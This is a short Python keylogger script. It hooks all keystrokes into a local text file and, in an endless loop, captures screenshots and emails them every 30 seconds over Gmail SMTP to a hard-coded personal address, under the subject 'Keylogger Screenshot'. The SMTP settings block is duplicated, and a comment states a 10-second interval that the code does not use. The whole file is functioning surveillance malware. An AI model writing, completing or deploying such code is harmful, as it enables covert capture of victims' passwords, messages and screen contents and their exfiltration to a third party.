import os
import keyboard
import time
import smtplib
import pyscreenshot as ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# Set up SMTP server and email addresses
smtp_server = "smtp.gmail.com"
port = 587
sender_email = "prathamrajgor@gmail.com"
password = ""
receiver_email = "prathamrajgor@gmail.com"

# Set up SMTP server and email addresses
smtp_server = "smtp.gmail.com"
port = 587
sender_email = "prathamrajgor@gmail.com"
password = ""
receiver_email = "prathamrajgor@gmail.com"

# Function to send email with captured screenshot
def send_email(image_path):
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)

        subject = "Keylogger Screenshot"
        body = "Please see attached screenshot."

        with open(image_path, "rb") as f:
            image_data = f.read()

        msg = MIMEMultipart()
        msg.attach(MIMEText(body))
        image = MIMEImage(image_data, name=os.path.basename(image_path))
        msg.attach(image)
        msg["Subject"] = subject
        msg["From"] = sender_email
        msg["To"] = receiver_email

        server.sendmail(sender_email, receiver_email, msg.as_string())

    except Exception as e:
        print(e)
    finally:
        server.quit()

# Function to capture and save screenshot
def capture_screenshot():
    image_path = "screenshot.png"
    im = ImageGrab.grab()
    im.save(image_path)
    return image_path

# Function to log keystrokes
def log_keystroke(event):
    if event.name == "esc":
        return False
    else:
        with open("keystrokes.txt", "a") as f:
            f.write(f"{event.name}\n")

# Set up keyboard hook to log keystrokes
keyboard.on_release(callback=log_keystroke)

while True:
    # Capture screenshot every 10 seconds and send email with screenshot
    image_path = capture_screenshot()
    send_email(image_path)
    time.sleep(30)
